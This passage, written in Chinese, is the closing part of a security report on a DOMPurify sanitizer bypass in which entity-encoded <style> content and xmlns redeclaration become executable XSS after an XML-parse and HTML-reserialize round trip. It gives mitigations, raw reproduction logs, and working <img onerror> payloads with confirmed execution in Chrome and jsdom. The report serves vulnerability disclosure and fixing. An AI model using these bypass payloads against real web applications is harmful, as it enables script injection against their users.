  sink.innerHTML = host.innerHTML;                      // 再进 HTML 解析
  return sink;
}
// 断言：sink.querySelectorAll('[onerror],script,iframe').length === 0
```

3. 用例至少覆盖：BC-1 各变体（div/svg/math-mtext/table/FORCE_BODY/WHOLE_DOCUMENT）、BC-2（`xmlns` 重声明）、BC-4（`&#123;&#123;` + `SAFE_FOR_TEMPLATES`）、BC-5 的四种入口矩阵、附录 A.5 的合法 CSS 语料（防误杀）。
4. 现有 `test/test-suite.js:6212-6280` 的 `#1150` 测试保留并补上本方向（净化侧 HTML + 消费侧 XHTML）。

### I7 防御性配置（给使用方的即时缓解）

在不改库的前提下，以下措施可以直接切断 BC-1/BC-2 的载体，按代价从小到大：

1. **禁止 `<style>`**：`FORBID_TAGS: ['style']`（实测 BC-1 变体 `removed=1`，输出 `<div></div>`）。代价是失去内联样式；如果业务必须允许样式，改用 `style` 属性 + 白名单（注意 `style` 属性本身也要按 CSS 过滤）。
2. **强白名单**：`ALLOWED_TAGS` 只保留业务需要的最小集合（实测 `['b','q']` 下所有变体输出为空）。
3. **只允许纯 HTML**：`USE_PROFILES: { html: true }`——注意它**不能**阻断 BC-1（实测仍然保留 `<style>&lt;…&gt;</style>`），它只减少外来内容面。
4. **启用 `SANITIZE_NAMED_PROPS: true`**：与本主题无关但可降低 clobber 面。
5. **CSP**：`script-src` 不含 `'unsafe-inline'`、`require-trusted-types-for 'script'`——即使绕过成立，内联 `onerror` 也被拦（纵深防御，不是修复）。
6. **管线层面**：如果必须做 XML 往返，**在写入 HTML 汇点之前再做一次 DOMPurify**（实测二次净化可清除），或让 XML 侧的消费只做展示（不把 XML 树序列化回 HTML）。

---

## 6. 附录 A：复现证据（原始输出）

环境：Chrome for Testing 159.0.8154.6 headless；jsdom 29.1.1 / Node v24.14.1；`dist/*` 为当前 `src` 构建（3.4.18，HEAD `f057f81`）。

### A.1 BC-1（Chrome）

```
F1 clean                : <div><style>&lt;/style&gt;&lt;img src="nope" onerror="window.__x=1"&gt;</style></div>   removed=0
F1 direct HTML insert   : imgs=0
F1 XML parse            : style@xhtml text="</style><img src=\"nope\" onerror=\"window.__x=1\">"
F1 HTML serialization   : <body><div><style></style><img src="nope" onerror="window.__x=1"></style></div></body>
F1 final HTML parse     : imgs=1 markup=<div><style></style><img src="nope" onerror="window.__x=1"></div>
F1 EXECUTED window.__x=1
```

jsdom：

```
clean: <div><style>&lt;/style&gt;&lt;img src="nope" onerror="alert(1)"&gt;</style></div>
jsdom chain: {"text":"</style><img src=\"nope\" onerror=\"alert(1)\">","ser":"<body><div><style></style><img src=\"nope\" onerror=\"alert(1)\"></style></div></body>","imgs":1,"on":1}
```

### A.2 BC-2（Chrome）

```
clean: <svg xmlns="http://www.w3.org/2000/svg"><style xmlns="http://www.w3.org/1999/xhtml">&lt;/style&gt;&lt;img src="nope" onerror="window.__x=42"&gt;</style></svg> | removed: 0
xml namespaces: svg@svg,style@xhtml
html-serialized: <body><svg xmlns="http://www.w3.org/2000/svg"><style xmlns="http://www.w3.org/1999/xhtml"></style><img src="nope" onerror="window.__x=42"></style></svg></body>
live: <svg xmlns="http://www.w3.org/2000/svg"><style xmlns="http://www.w3.org/1999/xhtml"></style></svg><img src="nope" onerror="window.__x=42"> | imgs= 1
EXECUTED window.__x=42
```

同一标记在 XHTML 净化模式下：

```
xhtml-mode clean: <html xmlns="http://www.w3.org/1999/xhtml"><head></head><body><svg xmlns="http://www.w3.org/2000/svg"/></body></html>   removed=1
```

### A.3 HTML 片段序列化的命名空间相关性（Chrome）

```
html style : <style>a<b>&c</style>            <- 原样
svg style  : <style>a&lt;b&gt;&amp;c</style>
math style : <style>a&lt;b&gt;&amp;c</style>
svg script : <script>a&lt;b&gt;&amp;c</script>
svg title  : <title>a&lt;b&gt;&amp;c</title>
```

### A.4 字符引用形式与多层实体的不动点（Chrome）

所有“单层”字符引用形式在**一次** XML 解析 + HTML 序列化 + HTML 解析后都会得到真实 `<img>` 并执行（`removed=0`）：

```
named  &lt; / &gt;         removed=0 text="</style><img src=\"nope\" onerror=\"window.__x=1\">"  imgs=1 on=1
dec    &#60; / &#62;       removed=0 同上                                                      imgs=1 on=1
hex    &#x3c; / &#x3e;     removed=0 同上                                                      imgs=1 on=1
padded &#060; / &#062;    removed=0 同上                                                      imgs=1 on=1
2x     &amp;lt; / &amp;gt;  removed=0 需要两跳才解码到 `<`: 第一跳 text 仍为 &lt;/style&gt; …   hop1 imgs=0
EXECUTED numeric x=1
```

多层实体（`&amp;lt;` 需要 2 跳、`&amp;amp;lt;` 需要 3 跳）说明检测必须做**不动点解码**，而不是只匹配 `&lt;`。`&#X3C;`（大写 X）在 XML 中不合法，整段解析失败，属“失败即安全”。

### A.5 I1 的误报/漏报评估（Chrome，按 I1 方案模拟）

```
合法:
  a{color:red}                                            -> 保留
  @media (min-width:600px){a>b{display:grid}}              -> 保留
  a::after{content:"&lt;"}                                 -> 保留（解码后无 </ <! <\w）
  a[href$=".pdf"]{}                                        -> 保留
  /* 1 &lt; 2 */ a{}                                       -> 保留
  .c{fill:#fff}（SVG 内）                                  -> 保留
危险（当前均保留，removed=0）:
  &lt;/style&gt;&lt;img onerror=x&gt;                        -> 删除
  &#60;/style&#62;…                                        -> 删除
  &amp;lt;/style&amp;gt;…                                  -> 删除（2 次不动点）
  SVG 命名空间同形                                          -> 删除
```

### A.6 BC-5 输入形状矩阵（Chrome / jsdom）

```
1 string, text/html          : <div><style>&lt;/style&gt;&lt;img …&gt;</style></div>   removed=0
2 string, xhtml+xml          : <html …><head></head><body><div></div></body></html>   removed=1
3 node from text/html        : <div><style>&lt;/style&gt;&lt;img …&gt;</style></div>   removed=0
4 node from xhtml+xml        : <div></div>                                            removed=1
5 IN_PLACE node from html    : …<style>&amp;lt;/style&amp;gt;…</style>               removed=0
6 IN_PLACE node from xhtml   : <div xmlns="…"></div>                                  removed=1
```

### A.7 BC-4 `SAFE_FOR_TEMPLATES`（Chrome）

```
1 SAFE_FOR_TEMPLATES clean: "<div><style>&#123;&#123; 7*7 &#125;&#125;</style><p>hi</p></div>" | removed: 0
2 xml style textContent: "{{ 7*7 }}" | mustache now live: true
3 html-serialized: "<body><div><style>{{ 7*7 }}</style><p>hi</p></div></body>"
5 control: html->html style text: "&#123;&#123; 7*7 &#125;&#125;"
```

### A.8 复现脚本

本轮验证脚本写在 `/tmp/dp149/`（一次性目录，未写入仓库）。关键断言的可复用版本已内联在 §5-I6；一次性脚本清单如下：

- `chain.js` / `consolidate.js` / `final_suite.js`：jsdom 下的跨上下文链路
- `chrome/pocexec.html`、`chrome/b2exec.html`、`chrome/report_poc.html`：Chrome 端到端执行证据
- `chrome/rules.html`、`chrome/rules2.html`、`chrome/dualparse.html`：I1/I2/I3 的误报与命中评估

运行方式（Chrome）：

```bash
chrome --headless=new --no-sandbox --disable-gpu \
       --virtual-time-budget=2500 --dump-dom file:///…/report_poc.html
```

---

## 7. 结论

1. **契约差异是根因**：净化决策基于“DOMPurify 自己解析出的树 + HTML 片段序列化字节串”，而安全性最终由“消费者如何解析、如何序列化、元素落在哪个命名空间”决定；库没有把这一上下文随产物传递，也没有在判定中建模。
2. **默认配置存在可执行链路**：`<style>` 默认允许，实体编码文本绕过字面文本守卫，下游 XHTML 解析 + HTML 序列化 + 再解析即可执行（Chrome 159 已确认）。
3. **`xmlns` 是最短的放大 gadget**：它既被允许又不与实际命名空间比对，可把任意元素（含 `style`）搬到消费者侧的任意命名空间，绕过仅按 `HTML_NAMESPACE` 生效的守卫。
4. **输入/输出侧不对称**：DOM 节点与 XHTML 解析入口已被加固（`README.md:86`、`test/test-suite.js:1804`），但“字符串输入 + 输出侧 XML 解析”没有覆盖，而这恰是最常见的用法。
5. **修复不需要外部服务**：I1（字符引用不动点探测）+ I2（`xmlns` 一致性/外来根标注）能覆盖已构造的全部案例，且对合法 CSS/SVG 无误杀；I3/I5 提供更强的“上下文一致”保证；I7 给出不改库即可落地的缓解组合。
